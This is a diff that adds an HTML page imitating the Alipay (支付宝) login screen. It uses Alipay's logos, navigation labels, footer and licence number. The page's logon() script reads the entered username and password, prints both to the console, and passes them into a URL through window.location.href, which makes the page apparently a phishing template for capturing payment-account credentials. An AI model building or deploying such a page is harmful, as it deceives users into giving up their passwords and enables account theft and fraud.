@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>登录-支付宝</title>
+        <meta charset="utf-8" />
+        <script>
+            window.onload = function()
+{
+    var height=window.screen.height;
+    y=height+"px";
+    var a=document.getElementById("img").style.height=y;
+    console.log(height)
+    return true
+}
+function logon(){
+    console.log("uses use the logon button")
+    var ps = document.getElementById("ps").value;
+    var users=document.getElementById("users").value;
+    if
+    (
+        users == ""
+    )
+    {
+        alert("用户名不可为空")
+        console.log("the input usersname is space")
+        return false
+    }
+    if 
+    (
+        ps == ""
+    )
+    {
+        alert("密码不可为空")
+        console.log("the input password is space")
+        return false
+    }
+    else
+    {
+        console.log(users)
+        console.log(ps)
+        info="'"+"usersname="+users+";"+"password="+ps
+        window.location.href=info;
+        return true
+    }
+}
+        </script>
+    </head>
+    <body style="margin: 0;padding: 0;">
+    <div class="img1">
+    <style>
+        .bg{
+            width: 100%;
+        }
+        .logo{
+            background-image: url(https://gw.alipayobjects.com/mdn/member_frontWeb/afts/img/A*oRlnSYAsgYQAAAAAAAAAAABkARQnAQ);
+            height: 100px;
+            width: 300px;
+            background-size: 100%;
+            background-repeat: no-repeat;
+        }
+        .img1
+        {
+            background-image: url(https://i.alipayobjects.com/e/201311/1V4o0zhQPN_src.jpg);
+            background-size: cover;
+            width: 100%;
+            bottom: 0;
+            top: 0;
+            position: absolute;
+            background-repeat: no-repeat;
+        }
+    </style>
+        <style>
+            .topdiv{
+                width: 100%;
+                margin-left: 0px;
+                margin-top: 0px;
+                margin-right: 0px;
+                height: 120px;
+                background-color: black;
+            }
+            .dw{
+                color: #0AE;
+                font-size: 40px;
+            }
+        </style>
+        <div align="center">
+            <div class="topdiv">
+                <table>
+                    <td align="left">
+                        <div align="left">
+                            <p class="dw">支付宝APP</p>
+                        </div>
+                    </td>
+                    <td>
+                        <div style="width: 30%;height: 120px;"></div>
+                    </td>
+                    <td>
+                        <style>
+                        .f1{
+                            font-size: 40px;
+                            color: darkgray
+                        };
+
+                        </style>
+                        <p class="f1">支付宝首页 |</p>
+                    </td>
+                    <td>
+                        <p class="f1"> 服务大厅 |</p>
+                    </td>
+                    <td>
+                        <p class="f1">提建议</p>
+                    </td>
+                </table>
+            </div>
+        </div>
+        <div align="center">
+            <div style="width: 100%;height: 100px;"></div>
+        </div>
+        <div align="center">
+            <div class="logo"></div>
+        </div>
+        <div align="center">
+            <div style="width: 100%;height: 70px;"></div>
+        </div>
+        <style>
+            .logon{
+                width: 80%;
+                height: auto;
+                background-color: black;
+            }
+            .font1{
+                font-size: 60px;
+                color: rgb(0, 153, 255);
+                height: 25px;
+            }
+        </style>
+        <div align="center">
+            <div class="logon">
+                <div align="center">
+                    <p class="font1">账密登录</p>
+                    <div style="width: 100%;height: 5px;background-color: rgb(0, 153, 255);"></div>
+                    <br />
+                    <div style="width: 90%;">
+                        <table width="90%">
+                            <td>
+                                <style>
+                                    .users{
+                                        width: 90px;
+                                        height: 90px;
+                                        background-image: url(./users.PNG);
+                                        background-repeat: no-repeat;
+                                        background-size: 100%;
+                                        float: right
+                                    }
+                                    .in{
+                                        width: 100%;
+                                        height: 80px;
+                                        font-size: 40px;
+                                        float: left;
+                                    }
+                                </style>
+                                <div class="users"></div>
+                            </td>
+                            <td>
+                                <input class="in" id="users" placeholder="邮箱地址/手机号码" />
+                            </td>
+                        </table>
+                        <br />
+                        <table width="90%">
+                            <td>
+                                <div class="password"></div>
+                            </td>
+                            <td>
+                                <input class="in" placeholder="密码" type="password" id="ps" />
+                            </td>
+                        </table>
+                    </div>
+                    <div style="width: 100%;height: 20px;"></div>
+                </div>
+                <div style="width: 80%;height: 350px;background-color: black;">
+                    <p style="float: right;color: white;font-size: 30px;">忘记登录密码?</p>
+                    <br />
+                    <button class="btn" onclick="logon()">登录</button>
+                    <P style="float: left;color: white;font-size: 30px;">淘宝会员登录</P>
+                    <p style="float: right;color: #0AE;font-size: 30px;">免费注册</p>
+                </div>
+            </div>
+            <style>
+                .btn{
+                    width: 90%;
+                    height: 100px;
+                    background-color: #0AE;
+                    color: white;
+                    font-size: 50px;
+                }
+                .password{
+                    width: 90px;
+                    height: 90px;
+                    background-repeat: no-repeat;
+                    background-size: 100%;
+                    background-image: url(./pass.PNG);
+                    float: right;
+                }
+            </style>
+        </div>
+        <div align="center">
+            <div style="width: 100%;height: 300px;"></div>
+        </div>
+        <div align="center">
+            <div style="width: 90%;">
+                <table>
+                    <style>
+                        .font2{
+                            font-size: 30px;
+                            color: black;
+                        }
+                    </style>
+                    <P class="font2">关于支付宝 | 诚征英才 | 联系我们 | Internetional Busincess | About Alipay</P>
+                    <p class="font2">ICP证：合字B2-20190046</p>
+            </div>
+        </div>
+        </div>
+    </body>
+</html>
